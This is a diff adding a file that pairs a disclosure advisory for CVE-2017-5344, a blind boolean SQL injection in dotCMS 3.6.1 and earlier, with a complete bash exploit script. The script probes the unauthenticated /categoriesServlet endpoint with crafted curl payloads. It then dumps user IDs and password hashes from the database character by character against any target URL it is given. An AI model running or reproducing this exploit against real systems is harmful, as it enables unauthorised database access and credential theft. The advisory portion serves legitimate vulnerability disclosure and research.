@@ -1,0 +1,333 @@
+: '
+# Blind Boolean SQL Injection in dotCMS <= 3.6.1 (CVE-2017-5344)
+
+## Product Description
+
+dotCMS is a scalable, java based, open source content management system
+(CMS) that has been designed to manage and deliver personalized, permission
+based content experiences across multiple channels. dotCMS can serve as the
+plaform for sites, mobile apps, mini-sites, portals, intranets or as a
+headless CMS (content is consumed via RESTful APIs). dotCMS is used
+everywhere, from running small sites to powering multi-node installations
+for governemnts, Fortune 100 companies, Universities and Global Brands. A
+dotCMS environment can scale to support hundreds of editors managing
+thousands of sites with millions of content objects.
+
+## Vulnerability Type
+
+Blind Boolean SQL injection
+
+## Vulnerability Description
+
+dotCMS versions up to 3.6.1 (and possibly others) are vulnerable to blind
+boolean SQL injection in the q and inode parameters at the
+/categoriesServlet path. This servlet is a remotely accessible,
+unauthenticated function of default dotCMS installations and can be
+exploited to exfiltrate sensitive information from databases accessible to
+the DMBS user configured with the product.
+
+Exploitation of the vulnerability is limited to the MySQL DMBS in 3.5 -
+3.6.1 as SQL escaping controls were added to address a similar
+vulnerability discovered in previous versions of the product. The means of
+bypassing these features which realise this vulnerability have only been
+successfully tested with MySQL 5.5, 5.6 and 5.7 and it is believed other
+DMBSes are not affected. Versions prior to 3.6 do not have these controls
+and can be exploited directly on a greater number of paired DMBSes.
+PostgreSQL is vulnerable in all described versions of dotCMS when
+PostgreSQL standard_confirming_strings setting is disabled (enabled by
+default).
+
+The vulnerability is the result of string interpolation and directly SQL
+statement execution without sanitising user input. The intermediate
+resolution for a previous SQLi vulnerability was to whitelist and partially
+filter user input before interpolation. This vulnerability overcomes this
+filtering to perform blind boolean SQL injection. The resolution to this
+vulnerability was to implement the use of prepared statements in the
+affected locations.
+
+This vulnerability has been present in dotCMS since at least since version
+3.0.
+
+## Exploit
+
+A proof of concept is available here:
+https://github.com/xdrr/webapp-exploits/tree/master/vendors/dotcms/2017.01.blind-sqli
+
+## Versions
+
+dotCMS <= 3.3.2 and MYSQL, MSSQL, H2, PostgreSQL
+
+dotCMS 3.5 - 3.6.1 and (MYSQL or PostgreSQL w/ standard_confirming_strings
+disabled)
+
+## Attack Type
+
+Unauthenticated, Remote
+
+## Impact
+
+The SQL injection vulnerability can be used to exfiltrate sensitive
+information from the DBMS used with dotCMS. Depending of the DBMS
+configuration and type, the issue could be as severe as establishing a
+remote shell (such as by using xp_exec on MSSQL servers) or in the most
+limited cases, restricted only to exfiltration of data in dotCMS database
+tables.
+
+## Credit
+
+This vulnerability was discovered by Ben Nott <pajexali@gmail.com>.
+
+Credit goes to Erlar Lang for discovering similar SQL injection
+vulnerabilities in nearby code and for inspiring this discovery.
+
+## Disclosure Timeline
+
+  * Jan 2, 2017 - Issue discovered.
+  * Jan 2, 2017 - Vendor advised of discovery and contact requested for
+full disclosure.
+  * Jan 4, 2017 - Provided full disclosure to vendor.
+  * Jan 5, 2017 - Vendor acknowledged disclosure and confirmed finding
+validity.
+  * Jan 14, 2017 - Vendor advised patch developed and preparing for release.
+  * Jan 24, 2017 - Vendor advised patching in progress.
+  * Feb 15, 2017 - Vendor advises ready for public disclosure.
+
+## References
+
+Vendor advisory: http://dotcms.com/security/SI-39
+CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5344
+'
+
+#!/bin/bash
+#
+# Dump password hashes from dotCMS <= 3.6.1 using blind boolean SQL injection.
+# CVE: CVE-2017-5344
+# Author: Ben Nott <pajexali@gmail.com>
+# Date: January 2017
+#
+# Note this exploit is tuned for MySQL backends but can be adapted
+# for other DMBS's.
+
+show_usage() {
+    echo "Usage $0 [target]"
+    echo
+    echo "Where:"
+    echo -e "target\t...\thttp://target.example.com (no trailing slash, port optional)"
+    echo
+    echo "For example:"
+    echo
+    echo "$0 http://www.examplesite.com"
+    echo "$0 https://www.mycmssite.com:9443"
+    echo
+    exit 1
+}
+
+test_exploit() {
+    target=$1
+    res=$(curl -k -s -X 'GET' \
+           -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0' -H 'Upgrade-Insecure-Requests: 1' \
+           "${target}/categoriesServlet?q=%5c%5c%27")
+
+    if [ $? -ne 0 ];
+    then
+        echo "Failed to connect. Check host and try again!"
+        exit 1
+    fi
+
+    if [ -z "$res" ];
+    then
+        echo "The target appears vulnerable. We're good to go!"
+    else
+        echo "The target isn't vulnerable."
+        exit 1
+    fi
+}
+
+dump_char() {
+    target=$1
+    char=$2
+    database=$3
+    index=$4
+    offset=$5
+    column=$6
+    avg_delay=$7
+
+    if [ -z "$offset" ];
+    then
+        offset=1
+    fi
+
+    if [[ $char != *"char("* ]];
+    then
+        char="%22${char}%22"
+    fi
+
+    if [ -z "$column" ];
+    then
+        column="password_"
+    fi
+
+    # Controls the avg delay of a FALSE
+    # request
+    if [ -z "$avg_delay" ];
+    then
+        avg_delay="0.100"
+    fi
+
+    res=$(curl -k -sS \
+        -w " %{time_total}" \
+        -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0' -H 'Upgrade-Insecure-Requests: 1' \
+        "${target}/categoriesServlet?q=%5c%5c%27)+OR%2f%2a%2a%2f(SELECT(SUBSTRING((SELECT(${column})FROM(${database}.user_)LIMIT%2f%2a%2a%2f${index},1),${offset},1)))LIKE+BINARY+${char}%2f%2a%2a%2fORDER+BY+category.sort_order%23")
+    data=$(echo $res | awk '{print $1}')
+    rtt=$(echo $res | awk '{print $2}')
+
+    # Calculate boolean based on time delay and
+    # data presence.
+    has_delay=$(echo "${rtt}>${avg_delay}" | bc -l)
+    if [ ! -z "$data" ];
+    then
+        if [ $has_delay -eq 1 ];
+        then
+            echo "$char"
+        fi
+    fi
+}
+
+testdb() {
+    target=$1
+    res=$(dump_char $target 1 "dotcms" 1 1)
+    if [ ! -z "$res" ];
+    then
+        echo "dotcms"
+    else
+        res=$(dump_char $target 1 "dotcms2")
+        if [ ! -z "$res" ];
+        then
+            echo "dotcms2"
+        fi
+    fi
+}
+
+convert_char() {
+    char=$1
+    conv="$char"
+
+    if [ "$char" == "char(58)" ];
+    then
+        conv=":"
+    elif [ "$char" == "char(47)" ];
+    then
+        conv="/"
+    elif [ "$char" == "char(61)" ];
+    then
+        conv="="
+    elif [ "$char" == "char(45)" ];
+    then
+        conv="-"
+    fi
+
+    echo -n "$conv"
+}
+
+a2chr() {
+    a=$1
+    printf 'char(%02d)' \'$a
+}
+
+n2chr() {
+    n=$1
+    printf 'char(%d)' $n
+}
+
+chr2a() {
+    chr=$1
+    chr=$(echo $chr | sed -e 's/char(//g' -e 's/)//g')
+    chr=`printf \\\\$(printf '%03o' $chr)`
+    echo -n $chr
+}
+
+iter_chars() {
+    target=$1
+    db=$2
+    user=$3
+    offset=$4
+    column=$5
+    for c in {32..36} {38..94} {96..126}
+    do
+        c=$(n2chr $c)
+        res=$(dump_char $target $c $db $user $offset $column)
+
+        if [ ! -z "$res" ];
+        then
+            chr2a $res
+            break
+        fi
+    done
+}
+
+exploit() {
+    target=$1
+    db=$(testdb $target)
+
+    if [ -z "$db" ];
+    then
+        echo "Unable to identify database name used by dotcms instance!"
+        exit 1
+    fi
+
+    echo "Dumping users and passwords from database..."
+    echo
+
+    for user in $(seq 0 1023);
+    do
+        validuser=1
+        echo -n "| $user | "
+        for offset in $(seq 1 1024);
+        do
+            res=$(iter_chars $target $db $user $offset "userid")
+            
+            if [ -z "$res" ];
+            then
+                if [ $offset -eq 1 ];
+                then
+                    validuser=0
+                fi
+                break
+            fi
+
+            echo -n "$res";
+        done
+
+        if [ $validuser -eq 1 ];
+        then
+            printf " | "
+        else
+            printf " |\n"
+            break
+        fi
+        for offset in $(seq 1 1024);
+        do
+            res=$(iter_chars $target $db $user $offset "password_")
+
+            if [ -z "$res" ];
+            then
+                break
+            fi
+
+            echo -n "$res";
+        done
+        printf " |\n"
+    done
+    echo
+    echo "Dumping complete!"
+}
+
+target=$1
+
+if [ -z "$target" ];
+then
+    show_usage
+fi
+
+test_exploit $target
+exploit $target
